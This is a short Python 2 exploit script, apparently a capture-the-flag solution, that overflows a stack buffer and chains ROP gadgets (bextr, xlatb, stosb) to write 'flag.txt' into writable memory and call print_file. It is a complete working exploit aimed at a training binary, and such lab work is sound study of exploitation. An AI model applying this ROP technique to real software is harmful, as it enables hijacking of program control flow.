import struct

def p64(addr):
    return struct.pack("<Q", addr)

# pop rdi; ret;
pop_rdi = 0x00000000004006a3

# stosb byte [rdi], al; ret
# OR 
# stos BYTE PTR es:[rdi], al; ret
# --------------
# It's like mov, but also increments RDI.
stosb = 0x0000000000400639

# pop rdx; pop rcx; add rcx, 0x3ef2; bextr rbx, rcx, rdx; ret;
# ----------
# Essentially, a way to alter RBX register:
# Extracts contiguous bits from RCX using an index value and length specified by RDX. 
# Bits 7:0 in RDX specifies the starting bit position of bit extraction. 
# Bits 15:8 in RDX specifies the maximum number of bits (LENGTH) beginning at the START position to extract. 
# The extracted bits are written to RBX starting from the least significant bit.
pop_bextr = 0x000000000040062a

def write_rbx(target):
    extract_size = 0x4000 # 16 bits from offset 0 in rcx
    rcx_add = 0x3ef2
    return p64(pop_bextr) + p64(extract_size) + p64(target - rcx_add)

# xlatb; ret
# OR
# xlat BYTE PTR ds:[rbx]; ret
# -----------
# Sets AL to memory at [rbx + al]
xlatb = 0x0000000000400628
current_al = 0x0b

def write_al(target_loc, target_chr):
    global current_al
    rbx = target_loc - current_al
    current_al = ord(target_chr)
    return write_rbx(rbx) + p64(xlatb)

offset = 40
# vmmap top rw-
write_loc = 0x0000000000601000 + 0x50
# print_file@plt
print_file = 0x0000000000400510
# grep <char> little 0x0000000000600000-0x0000000000602000
flag_txt = [(0x6003c4, "f"),
            (0x6003c5, "l"),
            (0x60041a, "a"),
            (0x6003cf, "g"),
            (0x601bfe, "."),
            (0x600426, "t"),
            (0x6007bc, "x"),
            (0x600426, "t")]

payload = "\x90" * offset +\
    p64(pop_rdi) + p64(write_loc) + "".join([write_al(*p) + p64(stosb) for p in flag_txt]) +\
    p64(pop_rdi) + p64(write_loc) + p64(print_file)

print payload
